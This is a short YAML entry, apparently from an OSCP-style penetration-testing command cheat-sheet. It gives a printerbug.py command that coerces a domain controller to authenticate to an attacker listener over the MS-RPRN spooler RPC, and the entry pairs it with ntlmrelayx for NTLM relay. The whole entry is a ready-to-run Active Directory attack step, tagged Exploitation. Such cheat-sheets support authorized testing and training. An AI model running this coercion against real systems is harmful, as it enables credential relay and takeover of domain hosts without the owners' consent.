---
command: |
  uv run printerbug.py $DOMAIN/$USER:$PASSWORD@$DC $LHOST
description: Coerce a host to authenticate back over MS-RPRN spooler RPC, pair with ntlmrelayx
os: [Linux]
category: [oscp, cli]
service: [RPC]
phase: [Exploitation]
references:
  - https://github.com/dirkjanm/krbrelayx
---
